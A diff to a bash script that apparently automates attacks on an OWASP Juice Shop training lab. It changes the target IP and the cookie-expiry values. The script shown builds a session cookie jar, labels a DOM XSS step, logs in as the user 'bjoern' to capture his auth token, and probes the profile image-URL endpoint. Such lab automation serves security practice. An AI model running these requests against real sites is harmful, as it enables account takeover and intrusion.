@@ -5,7 +5,7 @@ script=$(readlink -f $0)
 scriptpath=`dirname $script`
 
 # Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
-target_ip="10.10.243.253"
+target_ip="10.10.77.180"
 attack_ip="10.9.5.12"
 result_folder="/work/results/"
 
@@ -19,9 +19,8 @@ curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" 
 IO=$(grep io "$result_folder/1-cookies.txt" | awk '{print $7}')
 echo "--> Session initiated with cookie IO ${IO}"
 sed -i 's/#HttpOnly_//g' "$result_folder/1-cookies.txt"
-sed -i 's/\t0\t/\t-1\t/g' "$result_folder/1-cookies.txt"
-echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tlanguage\ten" >> $result_folder/1-cookies.txt
-echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tcookieconsent_status\tdismiss" >> $result_folder/1-cookies.txt
+echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/1-cookies.txt
+echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/1-cookies.txt
 
 # Use DOM XSS to play sound
 echo "1.1 - BONUS : PLAY SOUND WITH XSS"
@@ -41,7 +40,7 @@ curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/1-cookies
 BJOERN_TOKEN=$(jq -r '.authentication.token' $result_folder/1-bjoern.json)
 echo "--> Authenticated as bjoern with token $(echo "$BJOERN_TOKEN" | cut -c 1-20)...."
 cp $result_folder/1-cookies.txt $result_folder/1-bjoern-cookies.txt
-echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\ttoken\t$BJOERN_TOKEN" >> $result_folder/1-bjoern-cookies.txt
+echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$BJOERN_TOKEN" >> $result_folder/1-bjoern-cookies.txt
 ERROR=$(curl -s -X POST "http://$target_ip/profile/image/url" -b "$result_folder/1-bjoern-cookies.txt" -o /dev/null -w "%{http_code}" -L -H "Content-Type: application/x-www-form-urlencoded" -d "imageUrl=")
 echo "--> Accessing image link returned error $ERROR"
 
